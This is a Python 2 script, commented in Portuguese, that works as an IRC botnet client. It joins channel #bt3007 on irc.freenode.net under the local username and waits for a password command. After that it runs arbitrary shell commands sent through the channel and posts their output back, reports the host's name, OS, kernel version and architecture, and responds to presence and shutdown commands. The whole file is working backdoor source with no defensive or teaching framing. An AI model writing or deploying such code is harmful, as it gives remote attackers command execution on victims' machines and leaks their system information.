#! /usr/bin/env python
#coding: utf-8

from thread import *
from re import search
import socket
import time
import os
import sys

def connect(s, user, canal):
	s.send('NICK %s\r\n' %user)
	s.send('USER ' + nick + ' ' + user + ' ' + nick + ' .:\n')
	s.send('Join %s\r\n' %canal)

def getName():
	pipe = os.popen("whoami")
	name = pipe.read()
	name = name.replace("\n", "")
	pipe.close() 
	return name

def command(cmd):
	pipe = os.popen(cmd)
	a = pipe.read()
	a = a.replace("\n", " / ")
	pipe.close() 
	return a


server	= "irc.freenode.net"
port 	= 6667
canal 	= "#bt3007"
nick 	= getName()
senha 	= "123456"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
connect(s, nick, canal)
time.sleep(2)

wle = False
while wle == False:
	buf = s.recv(5000)
	if buf[0:4] == 'PING':
		s.send(buf.replace('PING', 'PONG'))
	if(search('Nickname is already in use', buf)):
		if(nick.replace(getName(), "") == "III"):
			nick = getName()+"IV"
		elif(nick.replace(getName(), "") == "IV"):
			nick = getName()+"V"
		elif(nick.replace(getName(), "") == "VIII"):
			nick = getName()+"IX"
		elif(nick.replace(getName(), "") == "IX"):
			nick = getName()+"X"
		else:
			nick = nick+"I"
		connect(s, nick, canal)
	if search('@ligar %s' %senha.lower(), buf.lower()):
		wle = True
		s.send('PRIVMSG %s : Conectado com sucesso!\r\n' %canal)

while True:
		buf = s.recv(5000)
		print buf
		if(buf[0:4] == "PING"):
			s.send(buf.replace("PING", "PONG"))
			pass
		try:
			buf = buf.split("$")
			buf = buf[1].split("@")
			if(buf[0].replace(" ", "").replace("\r\n", "").lower() == "online"):
				s.send("PRIVMSG %s : [*] %s \n\r" % (canal, nick))
				pass
			if(buf[0].replace(" ", "").replace("\r\n", "").lower() == "executar"):
				if(buf[1][2:].replace("\r\n", "").replace(" ", "").lower() == nick.lower()):
					cmd = buf[2][2:].replace("\r\n", "").lower()
					cmd = command(cmd)
					s.send("PRIVMSG %s : %s \r\n" % (canal, cmd))
					pass
			if(buf[0].replace(" ","").replace("\r\n", "").lower().lower() == "info"):
					if(buf[1][2:].replace("\r\n", "").lower() == nick.lower()):
			           		info = os.uname()
			        		s.send("PRIVMSG %s : ***************************************************** \n\r"%(canal))
					        s.send("PRIVMSG %s : * [+]Nome: %s \n\r"%(canal, info[1]))
					        s.send("PRIVMSG %s : * [+]OS: %s \n\r"%(canal, info[0]))
					        s.send("PRIVMSG %s : * [+]Versão: %s \n\r"%(canal, info[2]))
					        s.send("PRIVMSG %s : * [+]Arquitetura: %s \n\r"%(canal, info[4]))
					        s.send("PRIVMSG %s : ***************************************************** \n\r"%(canal))
					        pass
			if(buf[0].replace(" ", "").replace("\r\n", "").lower() == "desligar"):
				if(buf[1][2:].replace("\r\n", "").lower() == nick.lower()):
					    s.send("PRIVMSG %s : [+] %s desconectado com sucesso! \n\r"%(canal, nick))
					    break
					    s.close()
		except:
			pass